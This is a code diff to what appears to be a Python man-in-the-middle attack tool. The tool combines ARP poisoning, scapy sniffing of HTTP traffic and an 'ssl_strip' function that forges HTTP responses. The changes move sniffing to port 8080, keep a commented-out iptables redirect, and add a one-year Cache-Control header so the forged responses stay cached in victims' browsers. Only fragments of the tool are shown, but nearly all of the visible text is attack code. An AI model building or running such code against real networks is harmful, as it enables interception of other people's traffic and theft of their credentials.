@@ -18,7 +18,7 @@ def run(args):
     stop_event = threading.Event()
 
     try:
-        # Set up ip tables for rerouting http packets
+        #Set up ip tables for rerouting http packets
         #os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")
 
         poisoner = ArpPoisoner(args)
@@ -41,7 +41,7 @@ def run(args):
         arp_poison_thread.join()
 
 def start_sniffing(interface):
-    sniff(iface=interface, filter="tcp port 80", store=False, prn=ssl_strip)
+    sniff(iface=interface, filter="tcp port 8080", store=False, prn=ssl_strip)
 
 def ssl_strip(packet):
     if packet.haslayer(TCP) and packet[IP].dport == 80:
@@ -68,6 +68,7 @@ def ssl_strip(packet):
                     http_response = "HTTP/1.1 200 OK\r\n" \
                                     "Content-Type: {}\r\n" \
                                     "Content-Length: {}\r\n" \
+                                    "Cache-Control: public, max-age=31536000\r\n" \
                                     "\r\n" \
                                     "{}".format(content_type, content_length, response_body)
 
